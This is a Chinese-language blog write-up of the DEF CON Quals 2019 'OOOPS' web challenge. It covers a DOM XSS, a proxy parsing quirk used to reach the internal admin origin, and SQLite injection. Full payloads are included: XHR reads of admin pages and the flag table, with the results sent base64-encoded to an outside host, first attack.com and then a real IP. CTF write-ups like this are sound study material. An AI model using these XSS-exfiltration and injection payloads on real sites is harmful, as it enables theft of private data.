@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+<meta name="theme-color" content="#f8f5ec">
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="defcon quals 2019 ooops"><meta name="keywords" content="cyber security"><link rel="alternate" href="/atom.xml" title="Never Stop Exploiting"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0">
+<link rel="canonical" href="https://rebirthwyw.com/2019/05/24/defcon-quals-2019-ooops/">
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css"><link rel="stylesheet" type="text/css" href="/lib/nprogress/nprogress.min.css"><script type="text/x-mathjax-config">
+    MathJax.Hub.Config({ tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] } });
+  </script>
+  <script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0">
+
+<script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":true,"latex":true};
+</script>
+
+    <title>defcon quals 2019 ooops - Never Stop Exploiting</title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Never Stop Exploiting</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/archives/">
+        <li class="mobile-menu-item">Archives
+          </li>
+      </a><a href="/about">
+        <li class="mobile-menu-item">About
+          </li>
+      </a><a href="/links">
+        <li class="mobile-menu-item">Links
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Never Stop Exploiting</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            Archives
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about">
+            About
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/links">
+            Links
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">defcon quals 2019 ooops
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2019-05-24
+        </span></div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#前台xss"><span class="toc-text">前台xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代理解析问题"><span class="toc-text">代理解析问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#后台bot"><span class="toc-text">后台bot</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后台XSS"><span class="toc-text">后台XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#前后台解析不一致"><span class="toc-text">前后台解析不一致</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#任意执行js"><span class="toc-text">任意执行js</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后台sql注入"><span class="toc-text">后台sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#声明"><span class="toc-text">声明</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文同步发布于安全客，链接为 <a href="https://www.anquanke.com/post/id/179084" target="_blank" rel="noopener">https://www.anquanke.com/post/id/179084</a></p>
+<p>这次defcon quals的web又是大坑，花了最长时间的shellql最后是个pwn，拿flag全靠show full processlist</p>
+<p>wasm标着web&amp;pwn，结果逆向出flag</p>
+<p>唯有一道OOOPS算是比较纯正的，而且挺有意思的web题</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>最开始题目只给了一个pac文件，内容是一段混淆过的js代码。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>),</span><br><span class="line">        G = s.shift();</span><br><span class="line">    <span class="keyword">return</span> s.reverse().map(<span class="function"><span class="keyword">function</span> (<span class="params">f, i</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode(f - G - <span class="number">19</span> - i)</span><br><span class="line">    &#125;).join(<span class="string">''</span>)</span><br><span class="line">&#125;)(<span class="number">29</span>, <span class="number">202</span>, <span class="number">274</span>, <span class="number">265</span>, <span class="number">261</span>, <span class="number">254</span>, <span class="number">265</span>, <span class="number">251</span>, <span class="number">267</span>, <span class="number">227</span>, <span class="number">179</span>, <span class="number">247</span>, <span class="number">249</span>, <span class="number">260</span>, <span class="number">175</span>, <span class="number">244</span>, <span class="number">252</span>, <span class="number">172</span>, <span class="number">253</span>, <span class="number">239</span>, <span class="number">237</span>, <span class="number">250</span>, <span class="number">214</span>, <span class="number">166</span>, <span class="number">248</span>, <span class="number">237</span>, <span class="number">163</span>, <span class="number">245</span>, <span class="number">244</span>, <span class="number">229</span>, <span class="number">226</span>, <span class="number">225</span>, <span class="number">222</span>, <span class="number">156</span>, <span class="number">233</span>, <span class="number">219</span>, <span class="number">220</span>, <span class="number">152</span>, <span class="number">234</span>, <span class="number">219</span>, <span class="number">218</span>, <span class="number">237</span>, <span class="number">226</span>, <span class="number">222</span>, <span class="number">225</span>, <span class="number">221</span>, <span class="number">212</span>, <span class="number">142</span>, <span class="number">228</span>, <span class="number">219</span>, <span class="number">215</span>, <span class="number">208</span>, <span class="number">219</span>, <span class="number">205</span>, <span class="number">221</span>, <span class="number">213</span>, <span class="number">133</span>, <span class="number">221</span>, <span class="number">207</span>, <span class="number">208</span>, <span class="number">208</span>, <span class="number">128</span>, <span class="number">196</span>, <span class="number">198</span>, <span class="number">177</span>, <span class="number">124</span>, <span class="number">133</span>, <span class="number">137</span>, <span class="number">121</span>, <span class="number">120</span>, <span class="number">97</span>, <span class="number">209</span>, <span class="number">117</span>, <span class="number">125</span>, <span class="number">199</span>, <span class="number">197</span>, <span class="number">192</span>, <span class="number">184</span>, <span class="number">111</span>, <span class="number">122</span>, <span class="number">185</span>, <span class="number">190</span>, <span class="number">192</span>, <span class="number">114</span>, <span class="number">183</span>, <span class="number">183</span>, <span class="number">176</span>, <span class="number">186</span>, <span class="number">168</span>, <span class="number">178</span>, <span class="number">184</span>, <span class="number">168</span>, <span class="number">97</span>, <span class="number">125</span>, <span class="number">95</span>, <span class="number">138</span>, <span class="number">143</span>, <span class="number">145</span>, <span class="number">173</span>, <span class="number">169</span>, <span class="number">127</span>, <span class="number">177</span>, <span class="number">175</span>, <span class="number">165</span>, <span class="number">167</span>, <span class="number">132</span>, <span class="number">151</span>, <span class="number">160</span>, <span class="number">154</span>, <span class="number">118</span>) + (<span class="number">16</span>).toString(<span class="number">36</span>).toLowerCase().split(<span class="string">''</span>).map(<span class="function"><span class="keyword">function</span> (<span class="params">c</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode(c.charCodeAt() + (<span class="number">-71</span>))</span><br><span class="line">  ......</span><br><span class="line">  省略</span><br></pre></td></tr></table></figure>
+<p>直接console.log包裹就可以输出内容</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FindProxyForURL = <span class="function"><span class="keyword">function</span>(<span class="params">url, host</span>) </span>&#123;</span><br><span class="line">    <span class="comment">/* The only overflow employees can access is Order of the Overflow. Log in with OnlyOne:Overflow */</span></span><br><span class="line">    <span class="keyword">if</span> (shExpMatch(host, <span class="string">'oooverflow.io'</span>)) <span class="keyword">return</span> <span class="string">'DIRECT'</span>;<span class="keyword">return</span> <span class="string">'PROXY ooops.quals2019.oooverflow.io:8080'</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="前台xss"><a href="#前台xss" class="headerlink" title="前台xss"></a>前台xss</h3><p>直接http代理登录，访问ooops.quals2019.oooverflow.io后返回响应</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script src=&quot;main.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot; /&gt; </span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;h1&gt;Page Blocked&lt;/h1&gt;</span><br><span class="line">    &lt;img id=logo src=&quot;ooo.png&quot;&gt; &lt;br/&gt;</span><br><span class="line">    &lt;div id=&quot;blocked&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;a href=&quot;review.html&quot;&gt;Request site review&lt;/a&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>main.js的内容为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">split_url</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">    u = <span class="built_in">decodeURIComponent</span>(u); <span class="comment">// Stringify</span></span><br><span class="line">    output = u[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;u.length;i++) &#123;</span><br><span class="line">        output += u[i]</span><br><span class="line">        <span class="keyword">if</span> (i%<span class="number">55</span>==<span class="number">0</span>) output+= <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(output)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; </span><br><span class="line">    d = <span class="built_in">document</span>.getElementById(<span class="string">"blocked"</span>);</span><br><span class="line">    d.innerHTML=(split_url(<span class="built_in">document</span>.location) + <span class="string">" is blocked"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里可以很轻易的发现main.js在decode document.location后修改了innerHTML，导致了XSS的产生</p>
+<h3 id="代理解析问题"><a href="#代理解析问题" class="headerlink" title="代理解析问题"></a>代理解析问题</h3><p>客户端是通过http代理访问ooops.quals2019.oooverflow.io，经过测试，发现只要url的domain或者path部分出现了oooverflow.io，就会直接访问上述的响应内容，而不会真正去请求这个url</p>
+<p>比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://foo.com/oooverflow.io/?a=xxxx</span><br></pre></td></tr></table></figure></p>
+<p>这样的请求也会返回上述响应的内容</p>
+<h3 id="后台bot"><a href="#后台bot" class="headerlink" title="后台bot"></a>后台bot</h3><p>上述响应中还存在review.html，会让bot请求你输入的链接</p>
+<p>让bot访问你的vps，发现UA为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1</span><br></pre></td></tr></table></figure></p>
+<p>且referer为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.9.6:5000/admin/view/39</span><br></pre></td></tr></table></figure></p>
+<p>访问这个页面出现需要内网用户访问的提示</p>
+<h2 id="后台XSS"><a href="#后台XSS" class="headerlink" title="后台XSS"></a>后台XSS</h2><p>第一部分中，我们拥有了一个前台的js代码执行，但是在前台的域下，没有可用的信息。根据后台bot的信息，我们的目标应该是获取到后台  /admin/view/39  的内容或者是后台的cookie</p>
+<p>但是前后台跨域，因此需要先解决跨域的问题</p>
+<h3 id="前后台解析不一致"><a href="#前后台解析不一致" class="headerlink" title="前后台解析不一致"></a>前后台解析不一致</h3><p>首先，链接是由bot请求的，同时，bot请求也会经过代理。</p>
+<p>借助第一部分中代理只要包含oooverflow.io就会返回固定响应内容的特点，我们可以构造这样的请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.9.6:5000/oooverflow.io/</span><br></pre></td></tr></table></figure></p>
+<p>对于这个请求，bot首先发送给代理，代理会将固定的响应返回给bot，这时bot面对的是一个存在xss漏洞的页面，通过插入标签即可执行js代码，而这个时候，bot面对的域仍是10.0.9.6:5000，解决跨域的问题。</p>
+<p>这种思路和RPO很类似</p>
+<h3 id="任意执行js"><a href="#任意执行js" class="headerlink" title="任意执行js"></a>任意执行js</h3><p>根据第一部分的响应，在对document.location进行处理的时候，每55个字符会加上一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br/&gt;</span><br></pre></td></tr></table></figure></p>
+<p>绕过也很简单，通过执行下面代码的思路即可</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(location.hash.slice(<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+<p>因此payload的总体结构即为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.9.6:5000/oooverflow.io/?aaaaaaaaaaaaaaaaaaaa&lt;img src=1 onerror=eval(location.hash.slice(1))&gt;#function reqListener () &#123;var encoded = encodeURI(this.responseText);var b64 = btoa(this.responseText);var raw = this.responseText;document.write(&apos;&lt;iframe src=&quot;http://attack.com?data=&apos;+b64+&apos;&quot;&gt;&lt;/iframe&gt;&apos;);&#125; var oReq = new XMLHttpRequest();oReq.addEventListener(&quot;load&quot;, reqListener);oReq.open(&quot;GET&quot;, &quot;http://10.0.9.6:5000/admin/view/1&quot;);oReq.send();</span><br></pre></td></tr></table></figure>
+<h2 id="后台sql注入"><a href="#后台sql注入" class="headerlink" title="后台sql注入"></a>后台sql注入</h2><p>执行上述payload以后，响应的页面大致如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;OOOPS &amp;mdash; Evaluate Requests&lt;/title&gt;</span><br><span class="line">&lt;link href=&quot;/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">&lt;div class=&quot;row&quot;&gt;</span><br><span class="line">&lt;!-- Query: select rowid,* from requests where rowid=1 --&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">Request #1 from b&amp;#39;10.255.0.2&amp;#39;.</span><br><span class="line"> Automatically evaluated </span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;a id=&quot;lnk&quot; class=&quot;btn btn-secondary btn-block btn-lg&quot; href=&quot;xxxxxx&quot;&gt;</span><br><span class="line">Visit xxxxx</span><br><span class="line">&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>发现执行了sql语句，最基本最简单的id直接注入，唯一要注意的就是后台的数据库是sqlite而不是mysql</p>
+<p>最后flag在flag表中</p>
+<p>最终payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.9.6:5000/oooverflow.io/?aaaaaaaaaaaaaaaaaaaa&lt;img src=1 onerror=eval(location.hash.slice(1))&gt;#function reqListener () &#123;var encoded = encodeURI(this.responseText);var b64 = btoa(this.responseText);var raw = this.responseText;document.write(&apos;&lt;iframe src=&quot;http://118.89.245.122?data=&apos;+b64+&apos;&quot;&gt;&lt;/iframe&gt;&apos;);&#125; var oReq = new XMLHttpRequest();oReq.addEventListener(&quot;load&quot;, reqListener);oReq.open(&quot;GET&quot;, &quot;http://10.0.9.6:5000/admin/view/-1 union select (select flag from flag),2,3,4,5&quot;);oReq.send();</span><br></pre></td></tr></table></figure>
+<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>本文经安全客授权发布，转载请联系安全客平台</p>
+
+      </div>
+      <div class="post-copyright">
+    <p class="copyright-item">
+      <span>Author: </span>
+      <a href="https://rebirthwyw.com">rebirth</a>
+    </p>
+    <p class="copyright-item">
+      <span>Link: </span>
+      <a href="https://rebirthwyw.com/2019/05/24/defcon-quals-2019-ooops/">https://rebirthwyw.com/2019/05/24/defcon-quals-2019-ooops/</a>
+    </p>
+    <p class="copyright-item">
+      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
+    </p>
+  </div>
+      <footer class="post-footer">
+        
+        <nav class="post-nav"><a class="next" href="/2018/01/04/34c3-web-extract0r/">
+        <span class="next-text nav-default">34c3 web extract0r!</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"><div id="lv-container" data-id="city" data-uid="MTAyMC80NDExMy8yMDY0OA==">
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+      </div>  
+    </div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:rebirthwyw@gmail.com" class="iconfont icon-email" title="email"></a>
+        <a href="https://twitter.com/rebirthwyw1" class="iconfont icon-twitter" title="twitter"></a>
+        <a href="https://github.com/rebirthwyw" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year"><a href="http://www.beian.miit.gov.cn" rel="noopener" target="_blank">京ICP备19051299号</a>&copy;2018 - 2020<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">rebirth</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript">
+	(function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+  </script><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/lib/pjax/jquery.pjax.min.js"></script>
+  <script type="text/javascript" src="/lib/nprogress/nprogress.min.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
